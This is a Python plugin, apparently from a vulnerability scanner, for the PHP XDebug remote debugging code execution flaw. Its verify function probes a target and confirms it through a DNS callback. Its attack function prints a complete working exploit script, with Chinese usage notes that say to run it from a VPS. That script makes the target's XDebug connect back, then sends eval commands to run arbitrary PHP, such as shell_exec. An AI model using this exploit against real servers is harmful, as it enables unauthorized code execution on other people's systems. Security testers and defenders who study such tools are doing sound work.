import requests
import urllib
import re, random, string
import inc.dnslog


def verify(url):
    relsult = {
        'name': 'PHP XDebug 远程调试代码执行漏洞(无回显)',
        'vulnerable': False,
        'attack': True,
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
        'X-Forwarded-For': '',
    }
    try:
        dnslog = inc.dnslog.Dnslog()
        dns_domain = dnslog.dnslog_getdomain()
        if dns_domain:
            rand_str = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(5))
            headers['X-Forwarded-For'] = rand_str + '.' + dns_domain
            vurl = urllib.parse.urljoin(url, '?XDEBUG_SESSION_START=phpstorm')
            try:
                requests.get(vurl, timeout=5, headers=headers)
            except:
                pass
            dnslog.dnslog_sleep()
            dns_rep_text = dnslog.dnslog_getrep()
            if re.search(rand_str, dns_rep_text) and re.search(dns_domain, dns_rep_text):
                relsult['vulnerable'] = True
                relsult['url'] = url
                relsult['verify'] = rand_str + '.' + dns_domain
                relsult['about'] = 'https://github.com/vulhub/vulhub/blob/master/php/xdebug-rce/exp.py'
                relsult['attack'] = True
        return relsult
    except:
        return relsult


def attack(url):
    print('''
                    EXP 脚本
################################################################
#!/usr/bin/env python3
import re
import sys
import time
import requests
import argparse
import socket
import base64
import binascii
from concurrent.futures import ThreadPoolExecutor


pool = ThreadPoolExecutor(1)
session = requests.session()
session.headers = {
    'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)'
}

def recv_xml(sock):
    blocks = []
    data = b''
    while True:
        try:
            data = data + sock.recv(1024)
        except socket.error as e:
            break
        if not data:
            break

        while data:
            eop = data.find(b'\x00')
            if eop < 0:
                break
            blocks.append(data[:eop])
            data = data[eop+1:]

        if len(blocks) >= 4:
            break
    
    return blocks[3]


def trigger(url):
    time.sleep(2)
    try:
        session.get(url + '?XDEBUG_SESSION_START=phpstorm', timeout=0.1)
    except:
        pass


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='XDebug remote debug code execution.')
    parser.add_argument('-c', '--code', required=True, help='the code you want to execute.')
    parser.add_argument('-t', '--target', required=True, help='target url.')
    parser.add_argument('-l', '--listen', default=9000, type=int, help='local port')
    args = parser.parse_args()
    
    ip_port = ('0.0.0.0', args.listen)
    sk = socket.socket()
    sk.settimeout(10)
    sk.bind(ip_port)
    sk.listen(5)

    pool.submit(trigger, args.target)
    conn, addr = sk.accept()
    conn.sendall(b''.join([b'eval -i 1 -- ', base64.b64encode(args.code.encode()), b'\x00']))

    data = recv_xml(conn)
    print('[+] Recieve data: ' + data.decode())
    g = re.search(rb'<\!\[CDATA\[([a-z0-9=\./\+]+)\]\]>', data, re.I)
    if not g:
        print('[-] No result...')
        sys.exit(0)

    data = g.group(1)

    try:
        print('[+] Result: ' + base64.b64decode(data).decode())
    except binascii.Error:
        print('[-] May be not string result...')

################################################################''')
    print('''[+] 请在vps用python3运行此脚本， 来源: https://blog.csdn.net/zy15667076526/article/details/111824491''')
    print('''[+] 用法如: python3 exp.py -t 目标url -c "shell_exec('id');" ''')
    return True


